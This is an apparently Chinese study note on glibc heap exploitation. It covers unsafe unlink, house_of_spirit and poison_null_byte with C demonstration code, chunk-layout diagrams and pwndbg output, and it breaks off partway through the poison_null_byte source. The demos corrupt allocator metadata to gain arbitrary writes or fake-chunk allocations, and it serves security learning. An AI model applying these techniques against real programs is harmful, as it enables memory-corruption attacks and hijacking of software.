<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of previous chunk, if allocated            | |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |          Size of chunk          |MAIN_ARENA|IS MMAP|PREV INUSE|</span><br><span class="line">chunk0_ptr-&gt; -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             User data starts here...                          .</span><br><span class="line">  .                                                               .</span><br><span class="line">  .             (malloc_usable_size() bytes)                      .</span><br><span class="line">  .                                                               |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of previous chunk                            |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of chunk, in bytes                     | | |P|</span><br><span class="line">chunk1_ptr-&gt;-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Forward pointer to next chunk in list             |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Back pointer to previous chunk in list            |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Unused space (may be 0 bytes long)                .</span><br><span class="line">  .                                                               .</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<ul>
<li>为了绕过<code>P-&gt;fd-&gt;bk!=P || P-&gt;bk-&gt;fd!=P</code>，在chunk0中伪造新的区块</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of previous chunk, if allocated            | |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of chunk, in bytes                     | |M|P|</span><br><span class="line">chunk0_ptr-&gt; -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |                      fake prev size 0x0 	    	     		|</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        </span><br><span class="line">  |                      fake size 0x0                         |P |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+               </span><br><span class="line">  .            fake fd: &amp;chunk0_ptr - 24                          .</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ </span><br><span class="line">  .            fake bk: &amp;chunk0_ptr - 16                          .</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  .            unuse space                                        .</span><br><span class="line">  .                                                               .</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of previous chunk                            |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of chunk, in bytes                     | | |P|</span><br><span class="line">chunk1_ptr-&gt;-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-</span><br><span class="line">  |             0x0                                               |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             0x0                                                </span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Unused space (may be 0 bytes long)                .</span><br><span class="line">  .                                                               .</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<ul>
<li>利用chunk0的堆溢出，修改chunk1_ptr</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of previous chunk, if allocated            | |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of chunk, in bytes                     | |M|P|</span><br><span class="line">chunk0_ptr-&gt; -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |                      fake prev size 0x0 	    	     		|</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        </span><br><span class="line">  |                      fake size 0x0                         |P |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+               </span><br><span class="line">  .               fake fd: &amp;chunk0_ptr - 24                        .</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ </span><br><span class="line">  .               fake bk: &amp;chunk0_ptr - 16                       .</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  .                        unuse space                            .</span><br><span class="line">  .                                                               .</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |                        0x80                                   |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             0x145 &amp; ~1 = 0x144                          | | |P|</span><br><span class="line">chunk1_ptr-&gt;-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-</span><br><span class="line">  |             0x0                                               |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             0x0                                                </span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Unused space (may be 0 bytes long)                .</span><br><span class="line">  .                                                               .</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<ul>
<li>释放chunk1,这时候检测到fake chunk的状态为 <code>unuse</code>， 将触发unlink</li>
</ul>
<p>触发unlink之前：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p chunk0_ptr</span><br><span class="line">$34 = (uint64_t *) 0x603010</span><br><span class="line">pwndbg&gt; p &amp;chunk0_ptr</span><br><span class="line">$35 = (uint64_t **) 0x602070 &lt;chunk0_ptr&gt;</span><br></pre></td></tr></table></figure>
<p>触发unlink之后，由于</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br></pre></td></tr></table></figure>
<p>chunk0_ptr的值将被覆盖为chunk0_ptr - 0x18</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p chunk0_ptr</span><br><span class="line">$37 = (uint64_t *) 0x602058</span><br><span class="line">pwndbg&gt; p &amp;chunk0_ptr</span><br><span class="line">$40 = (uint64_t **) 0x602070 &lt;chunk0_ptr&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>创建字符串 victim_string，并赋值<code>Hello ~</code></p>
</li>
<li><p>这时候，向chunk0中填充数据，也就相当于向  <code>0x602058</code>中填充数据</p>
<p><code>chunk0_ptr[3] = (uint64_t) victim_string</code></p>
<p>此时<code>0x602070</code>的值将被覆盖为 victim_string的地址</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;victim_string</span><br><span class="line">$38 = (char (*)[8]) 0x7fffffffdd40</span><br><span class="line">pwndbg&gt; p chunk0_ptr</span><br><span class="line">$39 = (uint64_t *) 0x7fffffffdd40</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>chunk0_ptr[0] = 0x4141414142424242LL;</code><br><code>fprintf(stderr, &quot;New Value: %s\n&quot;,victim_string);</code></p>
<p>这时候，修改chunk0，也就相当于修改victim_string</p>
</li>
</ul>
<p><strong>漏洞成因:</strong></p>
<ol>
<li><strong>为了节约内存，被使用之后的chunk和未使用的chunk的内存布局不相同，但是都用了相同的大小，于是free chunk具有更多的数据。 </strong></li>
<li><strong>glibc的堆空间控制是用链表处理的，其中除了fastbin（bin可以认为是链表的头结点指针，用来标志不同的链表），都使用了双向链表的结构，即使用fd和bk指针指向前者和后者，这恰巧是free chunk才有的额外数据。</strong> </li>
<li><strong>在分配或是合并的时候需要删除链表中的一个结点，大概是P-&gt;fd-&gt;bk = P-&gt;bk; P-&gt;bk-&gt;fd = P-&gt;fd;,而在做这个操作之前会有一个简单的检查，即查看P-&gt;fd-&gt;bk == P &amp;&amp; P-&gt;bk-&gt;fd= == P,但是这个检查有个致命的弱点，就是因为他查找fd和bk都是通过相对位置去查找的，那么虽然P-&gt;fd和P-&gt;bk都不合法，但是P-&gt;fd-&gt;bk和P-&gt;bk-&gt;fd合法就可以通过这个检测，而在删除结点的时候就会造成不同的效果了</strong><h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h1></li>
</ol>
<p>通常用来配合栈溢出使用,通常场景是，栈溢出无法覆盖到的 EIP ，而恰好栈中有一个即将被 free 的堆指针。我们通过在栈上 fake 一个fastbin chunk 接着在 free 操作时，这个栈上的堆块被放到 fast bin 中，下一次 malloc 对应的大小时，由于 fast bin 的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。所以利用的第一步不是去控制一个 chunk，而是控制传给 free 函数的指针，将其指向一个 fake chunk。所以 fake chunk 的伪造是关键。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, &quot;This file demonstrates the house of spirit attack.\n&quot;);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Calling malloc() once so that it sets up its memory.\n&quot;);</span><br><span class="line">	malloc(1);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;We will now overwrite a pointer to point to a fake &apos;fastbin&apos; region.\n&quot;);</span><br><span class="line">	unsigned long long *a;</span><br><span class="line">	// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span><br><span class="line">	unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;, sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[7]);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;);</span><br><span class="line">	fake_chunks[1] = 0x40; // this is the size</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;);</span><br><span class="line">        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span><br><span class="line">	fake_chunks[9] = 0x1234; // nextsize</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;, &amp;fake_chunks[1]);</span><br><span class="line">	fprintf(stderr, &quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;);</span><br><span class="line">	a = &amp;fake_chunks[2];</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Freeing the overwritten pointer.\n&quot;);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]);</span><br><span class="line">	fprintf(stderr, &quot;malloc(0x30): %p\n&quot;, malloc(0x30));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates the house of spirit attack.</span><br><span class="line">Calling malloc() once so that it sets up its memory.</span><br><span class="line">We will now overwrite a pointer to point to a fake &apos;fastbin&apos; region.</span><br><span class="line">This region (memory of length: 80) contains two chunks. The first starts at 0x7fffb45ee0a8 and the second at 0x7fffb45ee0d8.</span><br><span class="line">This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><br><span class="line">... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><br><span class="line">The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.</span><br><span class="line">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffb45ee0a8.</span><br><span class="line">... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next malloc will return the region of our fake chunk at 0x7fffb45ee0a8, which will be 0x7fffb45ee0b0!</span><br><span class="line">malloc(0x30): 0x7fffb45ee0b0</span><br></pre></td></tr></table></figure>
<p><strong>目的: 通过伪造fake chunk,在下一次申请chunk时，返回fake chunk的地址。这样当我们伪造的 fake chunk 内部存在不可控区域时，运用这一技术可以将这片区域变成可控的</strong></p>
<p>流程:</p>
<ul>
<li>申请一个1byte的chunk</li>
<li><p>申请一个指针 <code>unsigned long long *a;</code></p>
</li>
<li><p>申请一个数组 <code>unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));</code>并设置变量fake_chunks 16字节对齐，也就是首地址最后一位是 0。</p>
</li>
<li>伪造两个区块</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">fake_chunks[1] = 0x40;       // first size</span><br><span class="line"></span><br><span class="line">fake_chunks[9] = 0x1234;     // next size</span><br><span class="line"></span><br><span class="line">-----------------------------</span><br><span class="line">|         0x0               |	 &lt;=========== first fake chunk prev_size</span><br><span class="line">-----------------------------	</span><br><span class="line">|         0x40              |     &lt;========== fake_chunk[1]   =&gt; first fake chunk size</span><br><span class="line">-----------------------------</span><br><span class="line">|         0x0               |     &lt;========== a</span><br><span class="line">-----------------------------</span><br><span class="line">|         0x0               |</span><br><span class="line">-----------------------------</span><br><span class="line">|         0x0               |</span><br><span class="line">-----------------------------</span><br><span class="line">|         0x0               |</span><br><span class="line">-----------------------------</span><br><span class="line">|         0x0               |</span><br><span class="line">-----------------------------</span><br><span class="line">|         0x0               |</span><br><span class="line">-----------------------------</span><br><span class="line">|         0x0               |      &lt;=========== second fake chunk prev_size</span><br><span class="line">-----------------------------</span><br><span class="line">|         0x1234            |      &lt;========== fake_chunk[9] =&gt; second fake chunk size</span><br><span class="line">-----------------------------</span><br><span class="line">|         0x0               |</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure>
<ul>
<li><code>a = &amp;fake_chunks[2];</code></li>
<li>释放区块a, free(a)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x7fffffffdcf0 ◂— 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<ul>
<li>再次申请0x30大小的chunk，即可返回栈地址: <code>0x7fffffffdd00</code></li>
</ul>
<h1 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, &quot;Welcome to poison null byte 2.0!\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;Tested in Ubuntu 14.04 64bit.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;This technique can be used when you have an off-by-one into a malloc&apos;ed region with a null byte.\n&quot;);</span><br><span class="line"></span><br><span class="line">	uint8_t* a;</span><br><span class="line">	uint8_t* b;</span><br><span class="line">	uint8_t* c;</span><br><span class="line">	uint8_t* b1;</span><br><span class="line">	uint8_t* b2;</span><br><span class="line">	uint8_t* d;</span><br><span class="line">	void *barrier;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;We allocate 0x100 bytes for &apos;a&apos;.\n&quot;);</span><br><span class="line">	a = (uint8_t*) malloc(0x100);</span><br><span class="line">	fprintf(stderr, &quot;a: %p\n&quot;, a);</span><br><span class="line">	int real_a_size = malloc_usable_size(a);</span><br><span class="line">	fprintf(stderr, &quot;Since we want to overflow &apos;a&apos;, we need to know the &apos;real&apos; size of &apos;a&apos; &quot;</span><br><span class="line">		&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;, real_a_size);</span><br><span class="line"></span><br><span class="line">	/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span><br><span class="line">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span><br><span class="line">	 * the amount requested plus some amount required for the metadata. */</span><br><span class="line">	b = (uint8_t*) malloc(0x200);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;b: %p\n&quot;, b);</span><br><span class="line"></span><br><span class="line">	c = (uint8_t*) malloc(0x100);</span><br><span class="line">	fprintf(stderr, &quot;c: %p\n&quot;, c);</span><br><span class="line"></span><br><span class="line">	barrier =  malloc(0x100);</span><br><span class="line">	fprintf(stderr, &quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span><br><span class="line">		&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;, barrier);</span><br><span class="line"></span><br><span class="line">	uint64_t* b_size_ptr = (uint64_t*)(b - 8);</span><br><span class="line">	</span><br><span class="line">	*(size_t*)(b + 0x1f0) = 0x200;</span><br><span class="line">	// this technique works by overwriting the size metadata of a free chunk</span><br><span class="line">	free(b);</span><br><span class="line">	</span><br><span class="line">	fprintf(stderr, &quot;b.size: %#lx\n&quot;, *b_size_ptr);</span><br><span class="line">	fprintf(stderr, &quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;We overflow &apos;a&apos; with a single null byte into the metadata of &apos;b&apos;\n&quot;);</span><br><span class="line">	a[real_a_size] = 0; // &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br><span class="line">	fprintf(stderr, &quot;b.size: %#lx\n&quot;, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;</span><br><span class="line">	fprintf(stderr, &quot;c.prev_size is %#lx\n&quot;,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	b1 = malloc(0x100);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;b1: %p\n&quot;,b1);</span><br><span class="line">	fprintf(stderr, &quot;Now we malloc &apos;b1&apos;. It will be placed where &apos;b&apos; was. &quot;</span><br><span class="line">		&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;,*c_prev_size_ptr);</span><br><span class="line">	fprintf(stderr, &quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span><br><span class="line">		&quot;before c.prev_size: %lx\n&quot;,*(((uint64_t*)c)-4));</span><br><span class="line">	fprintf(stderr, &quot;We malloc &apos;b2&apos;, our &apos;victim&apos; chunk.\n&quot;);</span><br><span class="line">	// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span><br><span class="line"></span><br><span class="line">	b2 = malloc(0x80);</span><br><span class="line">	fprintf(stderr, &quot;b2: %p\n&quot;,b2);</span><br><span class="line"></span><br><span class="line">	memset(b2,&apos;B&apos;,0x80);</span><br><span class="line">	fprintf(stderr, &quot;Current b2 content:\n%s\n&quot;,b2);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Now we free &apos;b1&apos; and &apos;c&apos;: this will consolidate the chunks &apos;b1&apos; and &apos;c&apos; (forgetting about 